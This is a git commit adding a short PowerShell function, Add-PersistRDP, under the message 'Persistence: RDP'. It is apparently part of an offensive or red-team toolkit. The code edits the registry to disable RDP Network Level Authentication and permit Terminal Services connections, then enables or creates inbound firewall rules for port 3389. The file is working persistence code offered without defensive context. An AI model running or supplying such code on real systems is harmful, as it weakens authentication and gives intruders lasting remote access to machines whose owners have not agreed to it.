7df6f12483d2cc3123c7b2bda9332903a351e4d7
Altoid0 <Altoid0@IRON-FORGE>
2022-04-14 18:30:00 -0700

    Persistence: RDP

---
+++ Add-PersistRDP.ps1
@@ -0,0 +1,12 @@
+function Add-PersistRDP {
+    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0 -Force
+    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0 -Force
+    
+    if (Get-NetFirewallRule -DisplayGroup "Remote Desktop") {
+        Set-NetFirewallRule -DisplayGroup "Remote Desktop" -Action Allow -Enabled True
+    }
+    else {
+        New-NetFirewallRule -DisplayName "Remote Desktop - User Mode (UDP-In)" -Direction Inbound -LocalPort 3389 -Protocol UDP -Action Allow
+        New-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In)" -Direction Inbound -LocalPort 3389 -Protocol TCP -Action Allow
+    }
+}
